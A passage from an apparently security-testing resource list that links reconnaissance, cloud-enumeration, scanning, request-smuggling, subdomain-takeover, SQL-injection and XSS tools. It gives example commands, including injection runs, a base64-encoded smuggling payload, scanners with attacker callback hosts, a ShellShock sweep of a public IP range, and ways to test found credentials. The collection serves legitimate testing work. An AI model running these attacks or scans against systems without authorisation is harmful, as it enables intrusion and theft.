href="https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/">https://lab.wallarm.com/why-and-how-to-disable-introspection-query-for-graphql-apis/</a><br><br># Why and how to disable introspection query for GraphQL APIs</p><p><a href="https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/">https://lab.wallarm.com/securing-and-attacking-graphql-part-1-overview/</a><br><br># Securing GraphQL</p><p><a href="https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4">https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4</a><br><br># GraphQL vs REST API model, common security test cases for GraphQL endpoints.</p><p><a href="https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696">https://the-bilal-rizwan.medium.com/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696</a><br><br># GraphQL common vulnerabilities &amp; how to exploit them.</p><p><a href="https://cybervelia.com/?p=736">https://cybervelia.com/?p=736</a><br><br># GraphQL exploitation – All you need to know.</p><p><a href="https://portswigger.net/web-security/graphql">https://portswigger.net/web-security/graphql</a><br><br># GraphQL vulnerabilities generally arise due to implementation and design flaws.</p><p><a href="https://github.com/forcesunseen/graphquail">https://github.com/forcesunseen/graphquail</a><br><br># GraphQuail is a Burp Suite extension that offers a toolkit for testing GraphQL endpoints.</p><p><a href="https://github.com/graphql-kit/graphql-voyager">https://github.com/graphql-kit/graphql-voyager</a><br><br># Represent any GraphQL API as an interactive graph.</p><p><a href="https://github.com/assetnote/batchql">https://github.com/assetnote/batchql</a><br><br># BatchQL is a GraphQL security auditing script with a focus on performing batch GraphQL queries and mutations.</p><h3 id="General">General</h3><p><a href="https://github.com/redhuntlabs/Awesome-Asset-Discovery">https://github.com/redhuntlabs/Awesome-Asset-Discovery</a><br><br># Asset Discovery is the initial phase of any security assessment engagement, be it offensive or defensive. With the evolution of information technology, the scope and definition of assets has also evolved.</p><p><a href="https://spyse.com">https://spyse.com</a><br><br># Spyse holds the largest database of its kind, containing a wide range of OSINT data handy for the reconnaissance.</p><p><a href="https://github.com/yogeshojha/rengine">https://github.com/yogeshojha/rengine</a><br><br># reNgine is an automated reconnaissance framework meant for information gathering during penetration testing of web applications.</p><p><a href="https://github.com/phor3nsic/favicon_hash_shodan">https://github.com/phor3nsic/favicon_hash_shodan</a><br><br># Search for a framework by favicon</p><p><a href="https://github.com/righettod/website-passive-reconnaissance">https://github.com/righettod/website-passive-reconnaissance</a><br><br># Script to automate, when possible, the passive reconnaissance performed on a website prior to an assessment.</p><p><a href="https://dhiyaneshgeek.github.io/red/teaming/2022/04/28/reconnaissance-red-teaming/">https://dhiyaneshgeek.github.io/red/teaming/2022/04/28/reconnaissance-red-teaming/</a><br><br># Reconnaissance is carried out in a Red Teaming Engagement.</p><p><a href="https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=azure-ad">https://learn.microsoft.com/en-us/rest/api/storageservices/list-blobs?tabs=azure-ad</a><br><br># The List Blobs operation returns a list of the blobs under the specified container.<br><br><code>https://myaccount.blob.core.windows.net/mycontainer?restype=container&amp;comp=list</code></p><h2 id="Enumerating">Enumerating</h2><h3 id="Fingerprint">Fingerprint</h3><p><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a><br><br># WhatWeb identifies websites. Its goal is to answer the question, “What is that Website?”. WhatWeb recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.<br><br><code>whatweb -a 4 -U 'Mozilla' -c 'NAME1=VALUE1; NAME2=VALUE2' -t 20 www.example.com</code></p><p><a href="https://builtwith.com">https://builtwith.com</a><br><br># Find out what websites are Built With.</p><p><a href="https://www.wappalyzer.com">https://www.wappalyzer.com</a><br><br># Identify technologies on websites.</p><p><a href="https://webtechsurvey.com">https://webtechsurvey.com</a><br><br># Discover what technologies a website is built on or find out what websites use a particular web technology.</p><p><a href="https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb">https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb</a><br><br># Software Vulnerability Scanner Burp Extension</p><p><a href="https://github.com/GrrrDog/weird_proxies">https://github.com/GrrrDog/weird_proxies</a><br><br># It’s a cheat sheet about behaviour of various reverse proxies and related attacks.</p><h3 id="Buckets">Buckets</h3><p><a href="https://aws.amazon.com/cli/">https://aws.amazon.com/cli/</a><br><br># List s3 bucket permissions and keys<br><br><code>aws s3api get-bucket-acl --bucket examples3bucketname</code><br><br><code>aws s3api get-object-acl --bucket examples3bucketname --key dir/file.ext</code><br><br><code>aws s3api list-objects --bucket examples3bucketname</code><br><br><code>aws s3api list-objects-v2 --bucket examples3bucketname</code><br><br><code>aws s3api get-object --bucket examples3bucketname --key dir/file.ext localfilename.ext</code><br><br><code>aws s3api put-object --bucket examples3bucketname --key dir/file.ext --body localfilename.ext</code></p><p><a href="https://github.com/eth0izzle/bucket-stream">https://github.com/eth0izzle/bucket-stream</a><br><br># Find interesting Amazon S3 Buckets by watching certificate transparency logs</p><p><a href="https://buckets.grayhatwarfare.com/">https://buckets.grayhatwarfare.com/</a><br><br># Search Public Buckets</p><p><a href="https://github.com/VirtueSecurity/aws-extender">https://github.com/VirtueSecurity/aws-extender</a><br><br># Burp Suite extension which can identify and test S3 buckets</p><h3 id="Cloud-Enumeration">Cloud Enumeration</h3><p><br># Basic check<br><br><code>export AWS_ACCESS_KEY_ID=XYZ</code><br><br><code>export AWS_SECRET_ACCESS_KEY=XYZ</code><br><br><code>export AWS_SESSION_TOKEN=XYZ</code><br><br><code>aws sts get-caller-identity</code></p><p><a href="https://github.com/andresriancho/enumerate-iam">https://github.com/andresriancho/enumerate-iam</a><br><br># Found a set of AWS credentials and have no idea which permissions it might have?</p><p><a href="https://github.com/nccgroup/ScoutSuite">https://github.com/nccgroup/ScoutSuite</a><br><br># Scout Suite is an open source multi-cloud security-auditing tool, which enables security posture assessment of cloud environments.</p><p><a href="https://github.com/streaak/keyhacks">https://github.com/streaak/keyhacks</a><br><br># KeyHacks shows ways in which particular API keys found on a Bug Bounty Program can be used, to check if they are valid.</p><p><a href="https://github.com/ozguralp/gmapsapiscanner">https://github.com/ozguralp/gmapsapiscanner</a><br><br># Used for determining whether a leaked/found Google Maps API Key is vulnerable to unauthorized access by other applications or not.</p><p><a href="https://github.com/aquasecurity/trivy">https://github.com/aquasecurity/trivy</a><br><br># Trivy (tri pronounced like trigger, vy pronounced like envy) is a comprehensive security scanner. It is reliable, fast, extremely easy to use, and it works wherever you need it.</p><p><a href="https://github.com/initstring/cloud_enum">https://github.com/initstring/cloud_enum</a><br><br># Multi-cloud OSINT tool. Enumerate public resources in AWS, Azure, and Google Cloud.</p><p><a href="https://github.com/toniblyx/prowler">https://github.com/toniblyx/prowler</a><br><br># Prowler is an Open Source Security tool for AWS, Azure and GCP to perform Cloud Security best practices assessments, audits, incident response, compliance, continuous monitoring, hardening and forensics readiness.</p><p><a href="https://github.com/salesforce/cloudsplaining">https://github.com/salesforce/cloudsplaining</a><br><br># Cloudsplaining is an AWS IAM Security Assessment tool that identifies violations of least privilege and generates a risk-prioritized HTML report.</p><p><a href="https://github.com/cloudsploit/scans">https://github.com/cloudsploit/scans</a><br><br># CloudSploit by Aqua is an open-source project designed to allow detection of security risks in cloud infrastructure accounts, including: Amazon Web Services (AWS), Microsoft Azure, Google Cloud Platform (GCP), Oracle Cloud Infrastructure (OCI), and GitHub. These scripts are designed to return a series of potential misconfigurations and security risks.</p><p><a href="https://github.com/RhinoSecurityLabs/pacu">https://github.com/RhinoSecurityLabs/pacu</a><br><br># Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments.</p><p><a href="https://github.com/VirtueSecurity/aws-extender">https://github.com/VirtueSecurity/aws-extender</a><br><br># This Burp Suite extension can identify and test S3 buckets as well as Google Storage buckets and Azure Storage containers for common misconfiguration issues using the boto/boto3 SDK library.</p><p><a href="https://github.com/irgoncalves/gcp_security">https://github.com/irgoncalves/gcp_security</a><br><br># This repository is intented to have Google Cloud Security recommended practices, scripts and more.</p><p><a href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html">https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html</a><br><br># Instance metadata is data about your instance that you can use to configure or manage the running instance. Instance metadata is divided into categories, for example, host name, events, and security groups.</p><p><a href="https://cloud.google.com/compute/docs/storing-retrieving-metadata">https://cloud.google.com/compute/docs/storing-retrieving-metadata</a><br><br># Every instance stores its metadata on a metadata server. You can query this metadata server programmatically, from within the instance and from the Compute Engine API. You can query for information about the instance, such as the instance’s host name, instance ID, startup and shutdown scripts, custom metadata, and service account information. Your instance automatically has access to the metadata server API without any additional authorization.</p><p><a href="https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service">https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service</a><br><br># The Azure Instance Metadata Service (IMDS) provides information about currently running virtual machine instances. You can use it to manage and configure your virtual machines. This information includes the SKU, storage, network configurations, and upcoming maintenance events.</p><p><a href="https://www.alibabacloud.com/help/doc-detail/49122.htm">https://www.alibabacloud.com/help/doc-detail/49122.htm</a><br><br># Metadata of an instance includes basic information of the instance in Alibaba Cloud, such as the instance ID, IP address, MAC addresses of network interface controllers (NICs) bound to the instance, and operating system type.</p><p><a href="https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/">https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/</a><br><br># Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments.</p><p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/cognito-user-pools">https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/cognito-user-pools</a><br><br># A user pool is a user directory in Amazon Cognito. With a user pool, your users can sign in to your web or mobile app through Amazon Cognito, or federate through a third-party identity provider (IdP). Whether your users sign in directly or through a third party, all members of the user pool have a directory profile that you can access through an SDK.</p><p><a href="https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/">https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/</a><br><br># This post gives a deep dive into a critical security flaw that was present in Flickr’s login flow.</p><p><a href="https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p1/">https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p1/</a><br><a href="https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2/">https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2/</a><br><br># Attacking AWS Cognito with Pacu.</p><h3 id="Containerization">Containerization</h3><p><a href="https://github.com/stealthcopter/deepce">https://github.com/stealthcopter/deepce</a><br><br># Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE).</p><h3 id="Visual-Identification">Visual Identification</h3><p><a href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness</a><br><br># EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known.<br><br><code>eyewitness --web --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36&quot; --threads 10 --timeout 30 --prepend-https -f &quot;$&#123;PWD&#125;/subdomains.txt&quot; -d &quot;$&#123;PWD&#125;/eyewitness/&quot;</code></p><p><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a><br><br># Aquatone is a tool for visual inspection of websites across a large amount of hosts and is convenient for quickly gaining an overview of HTTP-based attack surface.<br><br><code>cat targets.txt | aquatone</code></p><p><a href="https://github.com/sensepost/gowitness">https://github.com/sensepost/gowitness</a><br><br># gowitness is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.<br><br><code>gowitness scan --cidr 192.168.0.0/24 --threads 20</code></p><p><a href="https://github.com/BishopFox/eyeballer">https://github.com/BishopFox/eyeballer</a><br><br># Eyeballer is meant for large-scope network penetration tests where you need to find “interesting” targets from a huge set of web-based hosts.<br><br><code>eyeballer.py --weights YOUR_WEIGHTS.h5 predict PATH_TO/YOUR_FILES/</code></p><h2 id="Scanning">Scanning</h2><h3 id="Static-Application-Security-Testing">Static Application Security Testing</h3><p><a href="https://github.com/returntocorp/semgrep">https://github.com/returntocorp/semgrep</a><br><br># Semgrep is a fast, open-source, static analysis tool that excels at expressing code standards — without complicated queries — and surfacing bugs early at editor, commit, and CI time.</p><p><a href="https://owasp.org/www-project-dependency-check/">https://owasp.org/www-project-dependency-check/</a><br><br># Dependency-Check is a Software Composition Analysis (SCA) tool that attempts to detect publicly disclosed vulnerabilities contained within a project’s dependencies. It does this by determining if there is a Common Platform Enumeration (CPE) identifier for a given dependency. If found, it will generate a report linking to the associated CVE entries.</p><p><a href="https://owasp.org/www-community/Source_Code_Analysis_Tools">https://owasp.org/www-community/Source_Code_Analysis_Tools</a><br><br># Source code analysis tools, also known as Static Application Security Testing (SAST) Tools, can help analyze source code or compiled versions of code to help find security flaws.</p><p><a href="https://github.com/robotframework/robotframework">https://github.com/robotframework/robotframework</a><br><br># Robot Framework is a generic open source automation framework for acceptance testing, acceptance test driven development (ATDD), and robotic process automation (RPA). It has simple plain text syntax and it can be extended easily with generic and custom libraries.</p><p><a href="https://github.com/google/osv-scanner">https://github.com/google/osv-scanner</a><br><br># Use OSV-Scanner to find existing vulnerabilities affecting your project’s dependencies.</p><p><a href="https://github.com/securego/gosec">https://github.com/securego/gosec</a><br><br># Inspects source code for security problems by scanning the Go AST.</p><p><a href="https://dotnetfiddle.net">https://dotnetfiddle.net</a><br><br># We are a group of .NET developers who are sick and tired of starting Visual Studio, creating a new project and running it, just to test simple code or try out samples from other developers.</p><p><a href="https://jsfiddle.net">https://jsfiddle.net</a><br><br># Test your JavaScript, CSS, HTML or CoffeeScript online with JSFiddle code editor.</p><h3 id="Dependency-Confusion">Dependency Confusion</h3><p><a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610</a><br><br># How I Hacked Into Apple, Microsoft and Dozens of Other Companies.</p><p><a href="https://www.blazeinfosec.com/post/dependency-confusion-exploitation/">https://www.blazeinfosec.com/post/dependency-confusion-exploitation/</a><br><br># This blog post provides an overview of Dependency Confusion attacks and explains in detail how they can be exploited in the wild, with examples using NPM packages and tips to prevent these vulnerabilities from occurring.</p><p><a href="https://github.com/dwisiswant0/nodep">https://github.com/dwisiswant0/nodep</a><br><br># nodep check available dependency packages across npmjs, PyPI or RubyGems registry.</p><p><a href="https://github.com/visma-prodsec/confused">https://github.com/visma-prodsec/confused</a><br><br># A tool for checking for lingering free namespaces for private package names referenced in dependency configuration for Python (pypi) requirements.txt, JavaScript (npm) package.json, PHP (composer) composer.json or MVN (maven) pom.xml.</p><h3 id="Send-Emails">Send Emails</h3><p><a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c</a><br><br># Ticket Trick</p><p><a href="https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2">https://medium.com/intigriti/abusing-autoresponders-and-email-bounces-9b1995eb53c2</a><br><br># Abusing autoresponders and email bounces</p><p><br># Send multiple emails<br><br><code>while read i; do echo $i; echo -e &quot;From: example1@gmail.com\nTo: $&#123;i&#125;\nCc: example2@gmail.com\nSubject: This is the subject $&#123;i&#125;\n\nThis is the body $&#123;i&#125;&quot; | ssmtp $&#123;i&#125;,example2@gmail.com; done &lt; emails.txt</code></p><h3 id="Search-Vulnerabilities">Search Vulnerabilities</h3><p><a href="https://pypi.org/project/urlscanio/">https://pypi.org/project/urlscanio/</a><br><br># <a href="http://URLScan.io">URLScan.io</a> is a useful tool for scanning and obtaining information from potentially malicious websites. The creators of URLScan have very helpfully made an API which can be used to add some automation to your workflow. urlscanio is a simple Python CLI utility which makes use of the aforementioned APIs to automate my own personal workflow when it comes to using URLScan.<br><br><code>urlscanio -i https://www.example.com</code></p><p><a href="https://github.com/vulnersCom/getsploit">https://github.com/vulnersCom/getsploit</a><br><br># Command line search and download tool for Vulners Database inspired by searchsploit.<br><br><code>getsploit wordpress 4.7.0</code></p><p><a href="https://www.exploit-db.com/searchsploit">https://www.exploit-db.com/searchsploit</a><br><br># Included in our Exploit Database repository on GitHub is searchsploit, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go.<br><br><code>searchsploit -t oracle windows</code></p><p><a href="https://github.com/vulmon/Vulmap">https://github.com/vulmon/Vulmap</a><br><br># Vulmap is an open-source online local vulnerability scanner project. It consists of online local vulnerability scanning programs for Windows and Linux operating systems.</p><p><a href="https://grep.app">https://grep.app</a><br><br># Search across a half million git repos.</p><p><a href="https://github.com/0ang3el/aem-hacker">https://github.com/0ang3el/aem-hacker</a><br><br># Tools to identify vulnerable Adobe Experience Manager (AEM) webapps.<br><br><code>python3 aem_hacker.py -u https://example.com --host your_vps_hostname_ip</code></p><p><a href="https://github.com/laluka/jolokia-exploitation-toolkit">https://github.com/laluka/jolokia-exploitation-toolkit</a><br><br># Jolokia Exploitation Toolkit (JET) helps exploitation of exposed jolokia endpoints.</p><p><a href="https://github.com/cve-search/git-vuln-finder">https://github.com/cve-search/git-vuln-finder</a><br><br># Finding potential software vulnerabilities from git commit messages.<br><br><code>git-vuln-finder -r ~/git/curl | jq .</code></p><p><a href="https://github.com/internetwache/GitTools">https://github.com/internetwache/GitTools</a><br><br># This repository contains three small python/bash scripts used for the Git research.</p><h3 id="Web-Scanning">Web Scanning</h3><p><a href="https://github.com/psiinon/open-source-web-scanners">https://github.com/psiinon/open-source-web-scanners</a><br><br># A list of open source web security scanners on GitHub.</p><p><a href="https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner">https://support.portswigger.net/customer/portal/articles/1783127-using-burp-scanner</a><br><br># Burp Scanner is a tool for automatically finding security vulnerabilities in web applications.</p><p><a href="https://github.com/spinkham/skipfish">https://github.com/spinkham/skipfish</a><br><br># Skipfish is an active web application security reconnaissance tool.<br><br><code>skipfish -MEU -S dictionaries/minimal.wl -W new_dict.wl -C &quot;AuthCookie=value&quot; -X /logout.aspx -o output_dir http://www.example.com/</code></p><p><a href="https://github.com/sullo/nikto">https://github.com/sullo/nikto</a><br><br># Nikto is an Open Source (GPL) web server scanner which performs comprehensive tests against web servers for multiple items, including over 6700 potentially dangerous files/programs, checks for outdated versions of over 1250 servers, and version specific problems on over 270 servers. It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.<br><br><code>nikto -ssl -host www.example.com</code></p><p><a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a><br><br># WordPress Security Scanner<br><br><code>wpscan --disable-tls-checks --ignore-main-redirect --user-agent 'Mozilla' -t 10 --force --wp-content-dir wp-content --url blog.example.com</code></p><p><a href="https://github.com/droope/droopescan">https://github.com/droope/droopescan</a><br><br># A plugin-based scanner that aids security researchers in identifying issues with several CMS.<br><br><code>droopescan scan drupal -u example.com</code></p><p><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a><br><br># Nuclei is used to send requests across targets based on a template leading to zero false positives and providing fast scanning on large number of hosts.<br><br><code>nuclei -l urls.txt -t cves/ -t files/ -o results.txt</code></p><p><a href="https://github.com/six2dez/reconftw">https://github.com/six2dez/reconftw</a><br><br># reconFTW is a tool designed to perform automated recon on a target domain by running the best set of tools to perform enumeration and finding out vulnerabilities.<br><br><code>reconftw.sh -d target.com -a</code></p><p><a href="https://gobies.org">https://gobies.org</a><br><br># The new generation of network security technology achieves rapid security emergency through the establishment of a complete asset database for the target.</p><p><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br><br># By using this tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable parameter or HTTP header.<br><br><code>python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;Submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</code></p><p><a href="https://github.com/MrCl0wnLab/ShellShockHunter">https://github.com/MrCl0wnLab/ShellShockHunter</a><br><br># Shellshock, also known as Bashdoor, is a family of security bugs in the Unix Bash shell, the first of which was disclosed on 24 September 2014.<br><br><code>python main.py --range '194.206.187.X,194.206.187.XXX' --check --thread 40 --ssl</code></p><p><a href="https://github.com/crashbrz/WebXmlExploiter/">https://github.com/crashbrz/WebXmlExploiter/</a><br><br># The WebXmlExploiter is a tool to exploit exposed by misconfiguration or path traversal web.xml files.</p><p><a href="https://github.com/stark0de/nginxpwner">https://github.com/stark0de/nginxpwner</a><br><br># Nginxpwner is a simple tool to look for common Nginx misconfigurations and vulnerabilities.</p><h3 id="HTTP-Request-Smuggling">HTTP Request Smuggling</h3><p><a href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a><br><br># An HTTP Request Smuggling / Desync testing tool written in Python 3.<br><br><code>python3 smuggler.py -q -u https://example.com/</code><br><br><br><br># Attacking through command line a HTTPS vulnerable service. Good for persistence when no one believes in you.<br><br><code>echo 'UE9TVCAvIEhUVFAvMS4xDQpIb3N0OiB5b3VyLWxhYi1pZC53ZWItc2VjdXJpdHktYWNhZGVteS5uZXQNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNg0KVHJhbnNmZXItRW5jb2Rpbmc6IGNodW5rZWQNCg0KMA0KDQpH' | base64 -d | timeout 1 openssl s_client -quiet -connect your-lab-id.web-security-academy.net:443 &amp;&gt;/dev/null</code></p><p><a href="https://github.com/neex/http2smugl">https://github.com/neex/http2smugl</a><br><br># This tool helps to detect and exploit HTTP request smuggling in cases it can be achieved via HTTP/2 -&gt; HTTP/1.1 conversion by the frontend server.<br><br><code>http2smugl detect https://example.com/</code></p><p><a href="https://github.com/BishopFox/h2csmuggler">https://github.com/BishopFox/h2csmuggler</a><br><br># h2cSmuggler smuggles HTTP traffic past insecure edge-server proxy_pass configurations by establishing HTTP/2 cleartext (h2c) communications with h2c-compatible back-end servers, allowing a bypass of proxy rules and access controls.<br><br><code>h2csmuggler.py -x https://example.com/ --test</code></p><p><a href="https://github.com/0ang3el/websocket-smuggle">https://github.com/0ang3el/websocket-smuggle</a><br><br># Smuggling HTTP requests over fake WebSocket connection.<br><br><code>python3 smuggle.py -u https://example.com/</code></p><p><a href="https://github.com/anshumanpattnaik/http-request-smuggling">https://github.com/anshumanpattnaik/http-request-smuggling</a><br><br># So the idea behind this security tool is to detect HRS vulnerability for a given host and the detection happens based on the time delay technique with the given permutes.</p><p><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><br># HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or more users.</p><p><a href="https://github.com/PortSwigger/http-request-smuggler">https://github.com/PortSwigger/http-request-smuggler</a><br><br># This is an extension for Burp Suite designed to help you launch HTTP Request Smuggling attacks, originally created during HTTP Desync Attacks research. It supports scanning for Request Smuggling vulnerabilities, and also aids exploitation by handling cumbersome offset-tweaking for you.</p><p><a href="https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142">https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142</a><br><br># This is how I was able to exploit a HTTP Request Smuggling in some Mobile Device Management (MDM) servers and send any MDM command to any device enrolled on them for a private bug bounty program.</p><p><a href="https://www.intruder.io/research/practical-http-header-smuggling">https://www.intruder.io/research/practical-http-header-smuggling</a><br><br># Modern web applications typically rely on chains of multiple servers, which forward HTTP requests to one another. The attack surface created by this forwarding is increasingly receiving more attention, including the recent popularisation of cache poisoning and request smuggling vulnerabilities. Much of this exploration, especially recent request smuggling research, has developed new ways to hide HTTP request headers from some servers in the chain while keeping them visible to others – a technique known as “header smuggling”. This paper presents a new technique for identifying header smuggling and demonstrates how header smuggling can lead to cache poisoning, IP restriction bypasses, and request smuggling.</p><p><a href="https://docs.google.com/presentation/d/1DV-VYkoEsjFsePPCmzjeYjMxSbJ9PUH5EIN2ealhr5I/">https://docs.google.com/presentation/d/1DV-VYkoEsjFsePPCmzjeYjMxSbJ9PUH5EIN2ealhr5I/</a><br><br># Two Years Ago @albinowax Shown Us A New Technique To PWN Web Apps So Inspired By This Technique AND @defparam’s Tool , I Have Been Collecting A Lot Of Mutations To Achieve Request Smuggling.</p><p><a href="https://github.com/GrrrDog/weird_proxies">https://github.com/GrrrDog/weird_proxies</a><br><br># It’s a cheat sheet about behaviour of various reverse proxies and related attacks.</p><p><a href="https://github.com/bahruzjabiyev/T-Reqs-HTTP-Fuzzer">https://github.com/bahruzjabiyev/T-Reqs-HTTP-Fuzzer</a><br><br># T-Reqs (Two Requests) is a grammar-based HTTP Fuzzer written as a part of the paper titled “T-Reqs: HTTP Request Smuggling with Differential Fuzzing” which was presented at ACM CCS 2021.</p><p><a href="https://github.com/BenjiTrapp/http-request-smuggling-lab">https://github.com/BenjiTrapp/http-request-smuggling-lab</a><br><br># Two HTTP request smuggling labs.</p><p><a href="https://infosec.zeyu2001.com/2022/http-request-smuggling-in-the-multiverse-of-parsing-flaws">https://infosec.zeyu2001.com/2022/http-request-smuggling-in-the-multiverse-of-parsing-flaws</a><br><br># Nowadays, novel HTTP request smuggling techniques rely on subtle deviations from the HTTP standard. Here, I discuss some of my recent findings and novel techniques.</p><h3 id="Subdomain-Takeover">Subdomain Takeover</h3><p><a href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a><br><br># Subdomain Takeover Scanner<br><br><code>tko-subs -data providers-data.csv -threads 20 -domains subdomains.txt</code></p><p><a href="https://github.com/haccer/subjack">https://github.com/haccer/subjack</a><br><br># Subjack is a Subdomain Takeover tool written in Go designed to scan a list of subdomains concurrently and identify ones that are able to be hijacked.<br><br><code>subjack -w subdomains.txt -t 100 -timeout 30 -o results.txt -ssl</code></p><p><a href="https://github.com/Ice3man543/SubOver">https://github.com/Ice3man543/SubOver</a><br><br># Subover is a Hostile Subdomain Takeover tool originally written in python but rewritten from scratch in Golang. Since it’s redesign, it has been aimed with speed and efficiency in mind.<br><br><code>SubOver -l subdomains.txt</code></p><p><a href="https://github.com/punk-security/dnsReaper">https://github.com/punk-security/dnsReaper</a><br><br># DNS Reaper is yet another sub-domain takeover tool, but with an emphasis on accuracy, speed and the number of signatures in our arsenal.<br><br><code>python3 main.py file --filename subdomains.txt</code></p><h3 id="SQLi-SQL-Injection">SQLi (SQL Injection)</h3><p><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a><br><br># sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers.<br><br><code>sqlmap --force-ssl -r RAW_REQUEST.txt --user-agent='Mozilla' --batch</code><br><br><code>sqlmap -vv -u 'https://www.example.com?id=1*' --user-agent='Mozilla' --level 5 --risk 3 --batch</code></p><h3 id="XSS">XSS</h3><p><a href="https://github.com/hahwul/dalfox">https://github.com/hahwul/dalfox</a><br><br># DalFox is a powerful open-source tool that focuses on automation, making it ideal for quickly scanning for XSS flaws and analyzing parameters. Its advanced testing engine and niche features are designed to streamline the process of detecting and verifying vulnerabilities.<br><br><code>dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&amp;artist\=123\&amp;asdf\=ff -b https://your-callback-url</code></p><p><a href="https://github.com/KathanP19/Gxss">https://github.com/KathanP19/Gxss</a><br><br># A Light Weight Tool for checking reflecting Parameters in a URL. Inspired by kxss by @tomnomnom.<br><br><code>echo &quot;https://www.example.com/some.php?first=hello&amp;last=world&quot; | Gxss -c 100</code></p><h3 id="Repositories-Scanning">Repositories Scanning</h3><p><a href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a><br><br># Gitleaks is a SAST tool for detecting hardcoded secrets like passwords, api keys, and tokens in git repos.</p><p><a href="https://github.com/michenriksen/gitrob">https://github.com/michenriksen/gitrob</a><br><br># Gitrob is a tool to help find potentially sensitive files pushed to public repositories on Github.</p><p><a href="https://github.com/dxa4481/truffleHog">https://github.com/dxa4481/truffleHog</a><br><br># Searches through git repositories for secrets, digging deep into commit history and branches.</p><p><a href="https://github.com/awslabs/git-secrets">https://github.com/awslabs/git-secrets</a><br><br># Prevents you from committing passwords and other sensitive information to a git repository.</p><p><a href="https://github.com/eth0izzle/shhgit">https://github.com/eth0izzle/shhgit</a><br><br># shhgit helps secure forward-thinking development, operations, and security teams by finding secrets across their code before it leads to a security breach.</p><p><a href="https://pinatahub.incognita.tech/">https://pinatahub.incognita.tech/</a><br><br># PinataHub allows you to explore a fraction of the 4M+ passwords and secrets committed in public GitHub repositories, detected by GoldDigger.</p><p><a href="https://github.com/adamtlangley/gitscraper">https://github.com/adamtlangley/gitscraper</a><br><br># A tool which scrapes public github repositories for common naming conventions in variables, folders and files.<br><br><code>php gitscraper.php &#123;GitHub Username&#125; &#123;GitHub Personal KEY&#125;</code></p><p><a href="https://www.gitguardian.com/">https://www.gitguardian.com/</a><br><br># Secure your software development lifecycle with enterprise-grade secrets detection. Eliminate 